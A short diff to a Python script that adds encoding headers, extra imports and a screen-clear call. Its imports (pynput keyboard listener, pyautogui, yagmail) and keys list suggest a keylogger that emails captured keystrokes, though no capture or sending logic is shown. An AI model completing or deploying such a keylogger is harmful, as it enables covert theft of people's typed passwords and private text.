@@ -1,3 +1,6 @@
+#coding: utf-8
+# -*- coding:utf-8 -*-
+
 import pyautogui
 import pynput
 from pynput.keyboard import Key, Listener
@@ -5,10 +8,13 @@ import os.path
 from datetime import datetime
 import time 
 import yagmail
+import sys
+import os
 
 R = '\033[31m' # Red
 W = '\033[0m'  # White
 C = '\033[36m' # Cyan
+os.system('cls')
 
 count = 0
 keys = []
